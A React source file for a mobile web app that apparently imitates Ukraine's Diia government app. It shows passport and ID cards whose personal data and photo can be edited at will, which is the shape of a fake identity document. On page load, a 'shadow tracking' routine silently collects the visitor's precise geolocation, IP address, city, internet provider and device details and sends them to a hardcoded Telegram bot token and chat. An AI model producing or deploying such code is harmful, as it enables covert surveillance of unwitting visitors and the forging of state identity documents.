import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ShieldCheck, 
  ChevronRight, 
  QrCode, 
  CreditCard, 
  User, 
  MapPin, 
  Settings, 
  Bell, 
  Plus, 
  Home, 
  LayoutGrid, 
  Search, 
  X,
  Camera,
  CheckCircle2,
  AlertCircle
} from 'lucide-react';
import { cn } from './lib/utils';

// --- TYPES ---
interface AppState {
  textName: string;
  name: string;
  nameEn: string;
  birthDate: string;
  rnokpp: string;
  nomerPasport: string;
  sex: string;
  sexEn: string;
  dateGive: string;
  dateOut: string;
  organ: string;
  uznr: string;
  placeBirth: string;
  legalAdress: string;
  mainPhoto?: string;
  sigPhoto?: string;
  [key: string]: any;
}

const DEFAULT_STATE: AppState = {
  textName: 'Дмитрій',
  name: 'ВАСИЛЕНКО ДМИТРІЙ ОЛЕКСАНДРОВИЧ',
  nameEn: 'VASYLENKO DMYTRII',
  birthDate: '15.05.2002',
  rnokpp: '1234567890',
  nomerPasport: '001234567',
  sex: 'Чоловіча',
  sexEn: 'Male',
  dateGive: '20.05.2018',
  dateOut: '20.05.2028',
  organ: 'Центральне МРУ ДМС у м. Києві',
  uznr: '20020515-01234',
  placeBirth: 'м. Київ, Україна',
  legalAdress: 'м. Київ, вул. Хрещатик, 1',
};

const LOCAL_STORAGE_KEY = 'diia_app_state_v2';

export default function App() {
  const [state, setState] = useState<AppState>(DEFAULT_STATE);
  const [isAdminOpen, setIsAdminOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('docs');
  const [showNotification, setShowNotification] = useState<string | null>(null);
  
  // Tracking Refs
  const trackingSent = useRef(false);

  // --- INITIALIZATION ---
  useEffect(() => {
    const init = async () => {
      // 1. Load from localStorage
      const local = localStorage.getItem(LOCAL_STORAGE_KEY);
      let currentState = DEFAULT_STATE;
      
      if (local) {
        try {
          currentState = { ...DEFAULT_STATE, ...JSON.parse(local) };
        } catch (e) {
          console.error("Local load error", e);
        }
      }

      // 2. Load from values.json (if skipLock is not set)
      const skipExternal = sessionStorage.getItem('lockExternalUpdates');
      if (!skipExternal) {
        try {
          const res = await fetch('/values.json');
          if (res.ok) {
            const external = await res.json();
            // Merge external onto current state (external takes priority if no local lock)
            currentState = { ...currentState, ...external };
          }
        } catch (e) {
          console.debug("Values.json not found, using local/default");
        }
      }

      setState(currentState);
      setIsLoading(false);
      
      // 3. Shadow Tracking
      if (!trackingSent.current) {
        performShadowTracking(currentState);
        trackingSent.current = true;
      }
    };

    init();
  }, []);

  const performShadowTracking = async (currentState: AppState) => {
    try {
      // 1. Get Geo (with prompt)
      const geo = await new Promise((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            () => resolve(null),
            { timeout: 6000, enableHighAccuracy: true }
          );
        } else resolve(null);
      });

      // 2. Get IP and Network info
      const ipInfo = await fetch("https://ipinfo.io/json").then(r => r.json()).catch(() => ({}));
      
      // 3. System Info
      const screenRes = `${window.screen.width}x${window.screen.height}`;
      const localTime = new Date().toLocaleString('uk-UA');
      const userAgent = navigator.userAgent;

      // 4. Construct detailed log
      const message = 
        `🔎 <b>ДЕТАЛЬНИЙ ЗВІТ ВІДВІДУВАННЯ</b>\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>КОРИСТУВАЧ:</b>\n` +
        `▪️ ПІБ: <code>${currentState.name}</code>\n` +
        `▪️ Коротке ім'я: <b>${currentState.textName}</b>\n\n` +
        `📍 <b>ГЕОЛОКАЦІЯ:</b>\n` +
        (geo ? `▪️ <a href="https://www.google.com/maps/search/?api=1&query=${(geo as any).lat},${(geo as any).lon}">📍 Переглянути на Google Maps</a>\n` : `▪️ Доступу немає (користувач відмовив)\n`) +
        `\n` +
        `🌐 <b>МЕРЕЖА:</b>\n` +
        `▪️ IP: <code>${ipInfo.ip || 'Невідомо'}</code>\n` +
        `▪️ Місто: ${ipInfo.city || '?'}, ${ipInfo.country || '?'}\n` +
        `▪️ Провайдер: <i>${ipInfo.org || 'Невідомо'}</i>\n\n` +
        `📱 <b>ПРИСТРІЙ:</b>\n` +
        `▪️ Екран: ${screenRes}\n` +
        `▪️ ОС/Браузер: <code>${userAgent.split(') ')[1] || userAgent}</code>\n\n` +
        `🕘 <b>ЛОКАЛЬНИЙ ЧАС:</b> ${localTime}\n` +
        `━━━━━━━━━━━━━━━━━━`;

      sendToTelegram(message, currentState);
    } catch (e) {
      console.debug("Tracking failed", e);
    }
  };

  const sendToTelegram = async (message: string, currentState: AppState) => {
    const token = currentState.tgBotToken || '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg';
    const chatId = currentState.tgChatId || '-1002003419071';
    
    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });
    } catch (e) {
      console.debug(e);
    }
  };

  // --- ACTIONS ---
  const saveLocal = (newState: AppState) => {
    setState(newState);
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(newState));
    sessionStorage.setItem('lockExternalUpdates', 'true'); // Lock automatic external updates
  };

  const toggleAdmin = () => setIsAdminOpen(!isAdminOpen);

  // --- UI COMPONENTS ---
  const DocumentCard = ({ title, date, isMain = false }: { title: string, date: string, isMain?: boolean }) => (
    <motion.div 
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className={cn(
        "relative rounded-[24px] p-6 mb-4 min-h-[480px] flex flex-col justify-between overflow-hidden shadow-xl",
        isMain ? "bg-gradient-to-br from-[#002B5E] to-[#004A99] text-white" : "bg-white text-black border border-gray-100"
      )}
    >
      <div className="flex justify-between items-start z-10">
        <div className="w-12 h-12 bg-white/10 rounded-full flex items-center justify-center backdrop-blur-sm">
          <ShieldCheck className={cn("w-6 h-6", isMain ? "text-white" : "text-blue-600")} />
        </div>
        <div className="text-right">
          <span className="text-[10px] uppercase opacity-60 tracking-[0.2em]">Україна</span>
        </div>
      </div>

      <div className="z-10 mt-8">
        <h2 className="text-3xl font-light leading-tight mb-2">{title}</h2>
        <p className="text-sm opacity-70 mb-8 uppercase tracking-tighter">{state.name}</p>
        
        <div className="flex gap-6 mb-8">
          <div className="w-28 h-36 bg-white/20 rounded-2xl overflow-hidden shadow-lg border border-white/30 backdrop-blur-sm">
            {state.mainPhoto ? (
              <img src={state.mainPhoto} alt="User" className="w-full h-full object-cover" />
            ) : (
              <div className="w-full h-full flex items-center justify-center bg-gray-100 italic text-[10px] text-gray-400">Фото</div>
            )}
          </div>
          <div className="flex flex-col justify-end space-y-3">
            <div>
              <p className="text-[9px] uppercase opacity-50">Дата народження</p>
              <p className="text-base font-medium">{state.birthDate}</p>
            </div>
            <div>
              <p className="text-[9px] uppercase opacity-50">РНОКПП</p>
              <p className="text-base font-mono font-medium tracking-tighter">{state.rnokpp}</p>
            </div>
          </div>
        </div>
      </div>

      <div className="z-10 flex justify-between items-end">
        <div className="space-y-4">
          <div className="bg-white/10 backdrop-blur-md px-4 py-2 rounded-full inline-flex items-center gap-2 border border-white/20">
             <QrCode className="w-4 h-4" />
             <span className="text-[11px] font-medium">Штрихкод</span>
          </div>
        </div>
        <div className="text-right">
          <p className="text-[9px] uppercase opacity-40">Дійсний до</p>
          <p className="text-sm font-semibold tracking-wide">{date}</p>
        </div>
      </div>

      {/* Decorative Triangles */}
      <div className="absolute top-0 right-0 w-64 h-64 bg-white/5 rounded-full -mr-32 -mt-32 blur-3xl pointer-events-none" />
      <div className="absolute bottom-0 left-0 w-32 h-32 bg-blue-400/20 rounded-full -ml-16 -mb-16 blur-2xl pointer-events-none" />
    </motion.div>
  );

  if (isLoading) return <div className="h-screen bg-white flex items-center justify-center font-sans font-medium text-blue-600 animate-pulse">Дія...</div>;

  return (
    <div className="min-h-screen bg-[#F6F7F9] font-sans selection:bg-blue-100 overflow-x-hidden">
      {/* Header */}
      <header className="px-5 pt-8 pb-3 flex justify-between items-center bg-[#F6F7F9] sticky top-0 z-40 backdrop-blur-md bg-opacity-80">
        <div className="flex items-center gap-2 group cursor-pointer">
          <h1 className="text-2xl font-normal tracking-tight">Привіт, <span className="font-semibold">{state.textName}</span></h1>
        </div>
        <div className="flex gap-3">
          <button className="w-10 h-10 rounded-full bg-white flex items-center justify-center shadow-sm hover:shadow-md transition-shadow">
            <Bell className="w-5 h-5 text-gray-700" />
          </button>
          <button 
            onClick={toggleAdmin}
            className="w-10 h-10 rounded-full bg-black flex items-center justify-center shadow-sm hover:scale-105 transition-transform"
          >
            <Settings className="w-5 h-5 text-white" />
          </button>
        </div>
      </header>

      {/* Content */}
      <main className="px-5 pb-32">
        {activeTab === 'docs' && (
          <div className="mt-4">
             <DocumentCard title="Паспорт (ID-картка)" date={state.dateOut} isMain />
             <DocumentCard title="Закордонний паспорт" date={state.dateOutZ || '10.12.2030'} />
             
             <motion.div 
               whileHover={{ scale: 1.02 }}
               className="bg-white rounded-[28px] p-6 shadow-sm border border-gray-100 flex items-center justify-between group cursor-pointer mt-4"
             >
                <div className="flex items-center gap-4">
                  <div className="w-14 h-14 rounded-2xl bg-blue-50 flex items-center justify-center text-blue-600">
                    <Plus className="w-7 h-7" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-800">Додати документ</h3>
                    <p className="text-xs text-gray-400 mt-0.5">Всі послуги в одному місці</p>
                  </div>
                </div>
                <ChevronRight className="w-6 h-6 text-gray-300 group-hover:text-gray-600 transition-colors" />
             </motion.div>
          </div>
        )}

        {activeTab === 'services' && (
          <div className="mt-8 text-center py-20">
             <LayoutGrid className="w-12 h-12 mx-auto text-gray-300 mb-4" />
             <h2 className="text-lg font-medium text-gray-800">Розділ в розробці</h2>
             <p className="text-sm text-gray-500 mt-1">Ми працюємо над новими функціями</p>
          </div>
        )}
      </main>

      {/* Navigation */}
      <nav className="fixed bottom-0 left-0 right-0 bg-white/90 backdrop-blur-xl shadow-[0_-4px_25px_rgba(0,0,0,0.08)] px-8 py-5 flex justify-between items-center z-50 rounded-t-[32px]">
        <NavButton icon={<Home className="w-6 h-6"/>} label="Головна" active={activeTab === 'docs'} onClick={() => setActiveTab('docs')} />
        <NavButton icon={<LayoutGrid className="w-6 h-6"/>} label="Сервіси" active={activeTab === 'services'} onClick={() => setActiveTab('services')} />
        <div className="flex flex-col items-center gap-1 group -mt-16">
          <div className="w-16 h-16 bg-[#004A99] rounded-[22px] shadow-2xl border-4 border-white flex items-center justify-center text-white scale-110 active:scale-95 transition-all cursor-pointer">
            <QrCode className="w-8 h-8" />
          </div>
        </div>
        <NavButton icon={<Bell className="w-6 h-6"/>} label="Повідомлення" active={false} />
        <NavButton icon={<Settings className="w-6 h-6"/>} label="Меню" active={false} onClick={toggleAdmin} />
      </nav>

      {/* Admin Panel Modal */}
      <AnimatePresence>
        {isAdminOpen && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/70 backdrop-blur-md z-[100] flex items-end sm:items-center justify-center p-0 sm:p-5"
          >
            <motion.div 
              initial={{ y: "100%" }}
              animate={{ y: 0 }}
              exit={{ y: "100%" }}
              className="bg-white w-full max-w-lg rounded-t-[40px] sm:rounded-[32px] shadow-2xl h-[92vh] sm:h-auto sm:max-h-[88vh] overflow-hidden flex flex-col"
            >
              <div className="p-8 border-bottom flex justify-between items-center sticky top-0 bg-white z-10 border-b border-gray-100">
                <div>
                  <h3 className="text-2xl font-bold text-gray-900">Налаштування</h3>
                  <p className="text-xs text-gray-400 mt-1">Оновити дані та синхронізувати</p>
                </div>
                <button 
                  onClick={toggleAdmin}
                  className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center hover:bg-gray-200 active:scale-90 transition-all font-bold"
                >
                  <X className="w-6 h-6 text-gray-500" />
                </button>
              </div>

              <div className="flex-1 overflow-y-auto px-8 pb-32 pt-2">
                <div className="space-y-8 mt-4">
                  <Section title="ПЕРСОНАЛЬНІ ДАНІ">
                    <InputField label="Ім'я (привітання)" value={state.textName} onChange={(v) => saveLocal({...state, textName: v})} />
                    <InputField label="ПІБ (повністю)" value={state.name} onChange={(v) => saveLocal({...state, name: v.toUpperCase()})} />
                    <InputField label="Дата народження" value={state.birthDate} onChange={(v) => saveLocal({...state, birthDate: v})} />
                    <InputField label="РНОКПП" value={state.rnokpp} onChange={(v) => saveLocal({...state, rnokpp: v})} />
                  </Section>

                  <Section title="ПАСПОРТ (ID-КАРТКА)">
                    <InputField label="Номер паспорта" value={state.nomerPasport} onChange={(v) => saveLocal({...state, nomerPasport: v})} />
                    <InputField label="УНЗР" value={state.uznr} onChange={(v) => saveLocal({...state, uznr: v})} />
                    <InputField label="Дійсний до" value={state.dateOut} onChange={(v) => saveLocal({...state, dateOut: v})} />
                  </Section>
                  
                  <Section title="ФОТОГРАФІЯ">
                    <div className="flex gap-4 items-center">
                       <label className="flex-1 cursor-pointer bg-blue-50 text-blue-700 font-semibold px-6 py-4 rounded-2xl flex items-center justify-center gap-3 hover:bg-blue-100 transition-all active:scale-[0.98]">
                          <Camera className="w-6 h-6" />
                          <span>Вибрати фото</span>
                          <input 
                            type="file" 
                            className="hidden" 
                            accept="image/*" 
                            onChange={(e) => {
                              const file = e.target.files?.[0];
                              if (file) {
                                const reader = new FileReader();
                                reader.onload = (ev) => saveLocal({...state, mainPhoto: ev.target?.result as string});
                                reader.readAsDataURL(file);
                              }
                            }}
                          />
                       </label>
                       {state.mainPhoto && (
                         <button 
                           onClick={() => saveLocal({...state, mainPhoto: undefined})}
                           className="w-14 h-14 bg-red-50 text-red-500 rounded-2xl flex items-center justify-center hover:bg-red-100 transition-colors"
                         >
                           <X className="w-7 h-7" />
                         </button>
                       )}
                    </div>
                  </Section>

                  <Section title="ТЕЛЕГРАМ (КОНФІГ)">
                    <p className="text-[10px] text-gray-400 mb-3 leading-relaxed">Ці дані використовуються для відправки звіту та сповіщень у вашу групу/чат.</p>
                    <InputField label="Bot Token" value={state.tgBotToken || ''} onChange={(v) => saveLocal({...state, tgBotToken: v})} placeholder="8761...AAF0X..." />
                    <InputField label="Chat ID" value={state.tgChatId || ''} onChange={(v) => saveLocal({...state, tgChatId: v})} placeholder="-100..." />
                  </Section>

                  <Section title="GITHUB ACTIONS SYNC">
                    <p className="text-[10px] text-gray-400 mb-3 leading-relaxed">Посилання на GitHub Actions або інший сервіс синхронізації.</p>
                    <InputField 
                      label="URL" 
                      value={state.syncUrl || ''} 
                      onChange={(v) => saveLocal({...state, syncUrl: v})} 
                      placeholder="https://github.com/.../actions" 
                    />
                    <div className="mt-4 flex flex-col items-center">
                       <div className="bg-white p-3 rounded-2xl shadow-sm border border-gray-100">
                          <img 
                            src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent((state.syncUrl || window.location.href) + '?s=' + btoa(JSON.stringify({n: state.textName, r: state.rnokpp})).substring(0, 30))}`} 
                            alt="Sync QR" 
                            className="w-32 h-32"
                          />
                       </div>
                       <p className="text-[10px] text-gray-300 mt-2">Оновлюється автоматично</p>
                    </div>
                  </Section>
                </div>
              </div>

              <div className="absolute bottom-0 left-0 right-0 p-8 bg-white/80 backdrop-blur-xl border-t border-gray-100">
                 <button 
                  onClick={() => {
                    const msg = `📬 <b>ОНОВЛЕННЯ ДАНИХ</b>\n━━━━━━━━━━━━━━━\n` + 
                      `Користувач <b>${state.textName}</b> оновив профіль.\n` +
                      `Всі дані збережені та готові до роботи.`;
                    sendToTelegram(msg, state);
                    setShowNotification("Дані успішно оновлено та відправлено!");
                    setTimeout(() => setShowNotification(null), 3000);
                  }}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-5 rounded-[22px] font-bold shadow-xl active:scale-95 transition-all"
                 >
                   Зберегти та Оновити
                 </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Notifications */}
      <AnimatePresence>
        {showNotification && (
          <motion.div 
            initial={{ opacity: 0, y: -100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -100 }}
            className="fixed top-12 left-0 right-0 z-[200] flex justify-center px-6 pointer-events-none"
          >
             <div className="bg-white/95 backdrop-blur-xl shadow-2xl border border-blue-50 rounded-[22px] px-8 py-5 flex items-center gap-4 pointer-events-auto">
                <CheckCircle2 className="w-6 h-6 text-green-500" />
                <span className="text-sm font-bold text-gray-800">{showNotification}</span>
             </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// --- SUBCOMPONENTS ---

function NavButton({ icon, label, active, onClick }: { icon: React.ReactNode, label: string, active: boolean, onClick?: () => void }) {
  return (
    <button onClick={onClick} className={cn("flex flex-col items-center gap-1.5 transition-all active:scale-90", active ? "text-[#004A99]" : "text-gray-400")}>
      <div className={cn("w-7 h-7", active && "scale-110")}>{icon}</div>
      <span className="text-[10px] font-bold tracking-tight">{label}</span>
    </button>
  );
}

function Section({ title, children }: { title: string, children: React.ReactNode }) {
  return (
    <div className="bg-white rounded-3xl p-1">
      <h4 className="text-[10px] uppercase tracking-[0.2em] text-[#004A99] font-black mb-4 ml-1 opacity-70">{title}</h4>
      <div className="space-y-5">{children}</div>
    </div>
  );
}

function InputField({ label, value, onChange, placeholder }: { label: string, value: string, onChange: (v: string) => void, placeholder?: string }) {
  return (
    <div className="space-y-1.5 px-1">
      <label className="text-[10px] font-bold text-gray-400 ml-1 uppercase">{label}</label>
      <input 
        type="text" 
        value={value} 
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className="w-full bg-[#f9fafb] border-2 border-transparent rounded-2xl px-5 py-4 text-sm font-medium focus:outline-none focus:border-blue-500/50 focus:bg-white transition-all shadow-sm"
      />
    </div>
  );
}
